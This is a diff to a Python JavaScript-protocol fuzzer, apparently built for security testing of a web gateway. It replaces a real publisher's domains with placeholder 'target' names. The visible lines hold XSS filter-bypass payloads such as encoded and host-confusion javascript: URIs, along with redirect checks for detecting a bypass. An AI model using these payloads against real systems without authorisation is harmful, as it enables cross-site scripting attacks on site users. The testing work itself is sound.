@@ -283,7 +283,7 @@ class JavaScriptProtocolFuzzer:
             "javascript:\nalert(1)",
             "javascript:\ralert(1)",
             # Path/host confusion
-            "javascript://cornelsen.de/%0Aalert(1)",
+            "javascript://target.de/%0Aalert(1)",
             "javascript://user@evil.com:alert(1)",
             # Exotic HTML entities
             "javascript&#58;alert(1)",
@@ -393,7 +393,7 @@ class JavaScriptProtocolFuzzer:
                 if location and ('javascript:' in location or 'alert(' in location):
                     return True
                 # If redirect is to a different domain, might be a bypass
-                if location and not any(domain in location for domain in ['cornelsen.de', 'cornelsen.ai']):
+                if location and not any(domain in location for domain in ['target.de', 'target.ai']):
                     return True
                 # Normal redirects to same domain are not bypasses
                 return False
@@ -453,7 +453,7 @@ class JavaScriptProtocolFuzzer:
                 # If response contains normal page content, it's likely not a bypass
                 normal_indicators = [
                     'html', 'head', 'body', 'title', 'meta', 'link', 'script',
-                    'cornelsen', 'gateway', 'lti', 'learning', 'objects'
+                    'test', 'gateway', 'lti', 'learning', 'objects'
                 ]
                 
                 normal_count = sum(1 for indicator in normal_indicators if indicator in response_text)
@@ -487,7 +487,7 @@ class JavaScriptProtocolFuzzer:
                     if 'javascript:' in location:
                         return True
                     # If redirect is to external domain, might be bypass
-                    if not any(domain in location for domain in ['cornelsen.de', 'cornelsen.ai']):
+                    if not any(domain in location for domain in ['target.de', 'target.ai']):
                         return True
             
             return False
